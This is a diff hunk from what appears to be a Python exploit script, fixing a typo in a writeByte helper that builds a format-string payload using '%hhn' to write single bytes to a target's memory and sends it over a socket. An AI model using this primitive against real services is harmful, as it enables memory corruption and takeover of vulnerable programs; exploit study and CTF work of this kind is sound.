@@ -28,7 +28,7 @@ def interact(s):
     t.interact()
 
 def writeByte(s, addr, val, idx):
-    format = "%%%dc%%%d$hhn" % (val, indx + 4)
+    format = "%%%dc%%%d$hhn" % (val, idx + 4)
     format += "A"*(16 - len(format))
     s.send(format)
 
